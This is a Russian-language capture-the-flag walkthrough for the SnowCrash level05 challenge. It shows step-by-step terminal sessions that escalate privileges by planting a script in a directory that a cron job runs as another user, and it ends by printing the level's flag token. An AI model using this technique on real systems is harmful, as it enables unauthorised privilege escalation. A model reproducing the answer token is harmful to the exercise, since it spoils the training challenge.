0) пробуем getflag
<<<
level03@SnowCrash:~$ getflag
Check flag.Here is your token : 
Nope there is no token here for you sorry. Try again :)
>>>
1) В оснвоной директории ничего не лежит
<<<
level05@SnowCrash:~$ ls
level05@SnowCrash:~$ 
>>>
2) Ищем файлы которые принадлежат пользователю level05 -> ничего полезного, также все в папке proc.
2) Ищем файлы которые принадлежат пользователю flag05
<<<
level05@SnowCrash:~$ find / -user "flag05" 2>/dev/null
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver

level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
>>>
Т.е. он берет какие то файлы из дериктории /opt/openarenaserver/* и выполняет их а затем удалет.
3) Попробуем создать файл в этой директории
<<<
level05@SnowCrash:~$ touch /opt/openarenaserver/script.sh
level05@SnowCrash:~$ vim
level05@SnowCrash:~$ vim /opt/openarenaserver/script.sh
level05@SnowCrash:~$ cat /opt/openarenaserver/script.sh
#!/bin/bash
getflag
level05@SnowCrash:~$ /opt/openarenaserver/script.sh
bash: /opt/openarenaserver/script.sh: Permission denied
level05@SnowCrash:~$ chmod +x /opt/openarenaserver/script.sh
level05@SnowCrash:~$ /opt/openarenaserver/script.sh
Check flag.Here is your token : 
Nope there is no token here for you sorry. Try again :)
level05@SnowCrash:~$ /usr/sbin/openarenaserver
bash: /usr/sbin/openarenaserver: Permission denied
level05@SnowCrash:~$ ls -l /usr/sbin/openarenaserver
-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
>>>
4) при выполнении /usr/sbin/openarenaserver мы получаем Permission denied что логично поскольку файл принадлежит flag05:flag05. Значит файл нужно запускать или от пользотеля, или от группы или другим способом
5) можно посмотреть может это команда где то выполняется в автоматическом режиме 
<<<
level05@SnowCrash:/$ grep -rnw '/var' -e 'openarenaserver' 2> /dev/null
/var/mail/level05:1:*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
/var/spool/mail/level05:1:*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
level05@SnowCrash:/$ 
>>>
Выглядит как крон запись которая выполняется каждые 2 минуты.
<<<
level05@SnowCrash:/$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
>>>
su → переключение пользователя.
-c "..." → выполнить указанную команду.
"sh /usr/sbin/openarenaserver" → запустить скрипт /usr/sbin/openarenaserver через оболочку sh.
- flag05 → выполнить это от имени пользователя flag05.
Т.е. если крон запущен и выполняет данные инструкции то мы выполним наши скрипты от имени пользователя flag05. Что нам и нужно
6) Проверим запущен ли крон
<<<
level05@SnowCrash:/$ ps -ef | grep cron
root      1502     1  0 16:00 ?        00:00:00 cron
level05   3507  3149  0 18:10 pts/0    00:00:00 grep --color=auto cron
>>>
Крон запущен, теперь надо понять какие конфиги он подцкпляет
7) добавим а наш скрипт создание нового файла и сохранение туда getflag
<<<
level05@SnowCrash:/$ vim /opt/openarenaserver/script.sh
level05@SnowCrash:/$ cat /opt/openarenaserver/script.sh
#!/bin/bash

touch /tmp/getflag
getflag > /tmp/getflag

level05@SnowCrash:/$ ls /tmp/
ls: cannot open directory /tmp/: Permission denied
level05@SnowCrash:/$ cat tmp/getflag
Check flag.Here is your token : viuaaale9huek52boumoomioc
>>>